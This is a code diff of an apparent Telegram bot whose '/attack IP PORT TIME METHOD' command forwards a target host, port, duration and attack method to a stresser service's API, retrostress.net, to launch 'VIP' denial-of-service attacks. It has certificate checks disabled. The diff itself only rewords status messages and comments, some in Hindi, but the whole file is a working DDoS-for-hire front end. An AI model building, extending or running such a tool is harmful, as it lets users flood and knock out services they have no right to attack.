@@ -20,7 +20,7 @@ async def cmd_attack(message: types.Message):
     if len(args) < 5: return await message.answer("⚠️ `/attack IP PORT TIME METHOD`")
     
     target, port, duration, method = args[1], args[2], args[3], args[4]
-    sent = await message.answer("🚀 **LAUNCHING VIP ATTACK...**")
+    sent = await message.answer("🚀 **VIP TUNNEL ACTIVATED...**")
 
     headers = {
         "X-API-Key": API_KEY,
@@ -30,21 +30,19 @@ async def cmd_attack(message: types.Message):
     }
 
     try:
-        # Direct hit to the most stable endpoint
         url = f"https://retrostress.net/api/v1/tests?key={API_KEY}"
         payload = {"host": target, "port": int(port), "time": int(duration), "method": method.upper(), "vip": True}
-        
         res = requests.post(url, json=payload, headers=headers, timeout=20, verify=False)
         
         if res.status_code == 200:
-            await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Source: `VIP-GATEWAY` 🔥")
+            await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `HIT SUCCESS` 🔥")
         else:
-            await sent.edit_text(f"❌ **DENIED:** Server Rejected Request. Bhai, Cloud IP Blocked hai.")
+            await sent.edit_text("❌ **DENIED:** Cloud IP Blocked.")
     except Exception as e:
         await sent.edit_text(f"❌ **ERROR:** Connection Refused.")
 
 async def main():
-    # Simple polling for Render
+    # Render bypass: Hum polling start karenge
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
